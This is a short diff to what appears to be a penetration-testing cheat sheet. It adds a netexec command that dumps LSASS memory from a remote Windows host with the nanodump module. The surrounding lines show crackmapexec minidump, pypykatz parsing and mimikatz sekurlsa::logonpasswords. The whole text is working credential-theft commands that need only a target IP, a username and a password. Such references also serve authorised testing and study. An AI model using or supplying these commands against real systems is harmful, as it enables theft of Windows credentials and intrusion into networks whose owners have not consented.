@@ -127,6 +127,11 @@ whoami /priv
 crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
 pypykatz lsa minidump lsass.DMP
 ```
+or using netexec (faster, more modern)
+```bash
+nxc smb $TARGET_IP -u $USER -p $PASSWORD -M nanodump
+```
+
 run in a non-interactive shell
 ```powershell
 $results = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
